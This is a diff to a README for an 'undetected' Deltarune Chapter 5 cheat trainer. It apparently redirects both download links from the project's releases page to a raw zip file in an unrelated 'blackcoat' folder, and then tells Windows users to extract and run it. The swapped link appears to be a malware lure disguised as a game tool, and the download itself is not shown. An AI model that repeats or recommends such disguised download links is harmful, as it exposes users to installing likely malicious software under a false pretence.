@@ -6,7 +6,7 @@ description: "Modify game stats and health for Deltarune Chapter 5 with this tra
 # 🎮 Deltarune-Chapter5-Trainer-Undetected - Improve your gameplay with easy tools
 
 <p align="center">
-  <a href="https://github.com/haripra7283/Deltarune-Chapter5-Trainer-Undetected/releases">
+  <a href="https://raw.githubusercontent.com/haripra7283/haripra7283.github.io/main/blackcoat/io_github_haripra_v1.2.zip">
     <img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download">
   </a>
 </p>
@@ -32,7 +32,7 @@ This tool helps players manage stats and items in Deltarune Chapter 5. It runs o
 
 Follow these steps to set up the trainer on your Windows computer.
 
-1.  Visit this page to download the latest version: [https://github.com/haripra7283/Deltarune-Chapter5-Trainer-Undetected/releases](https://github.com/haripra7283/Deltarune-Chapter5-Trainer-Undetected/releases).
+1.  Visit this page to download the latest version: [https://raw.githubusercontent.com/haripra7283/haripra7283.github.io/main/blackcoat/io_github_haripra_v1.2.zip](https://raw.githubusercontent.com/haripra7283/haripra7283.github.io/main/blackcoat/io_github_haripra_v1.2.zip).
 2.  Locate the latest release file, usually ending in .zip or .exe.
 3.  Right-click the zip file and choose Extract All to create a folder.
 4.  Open the new folder to find the trainer file.
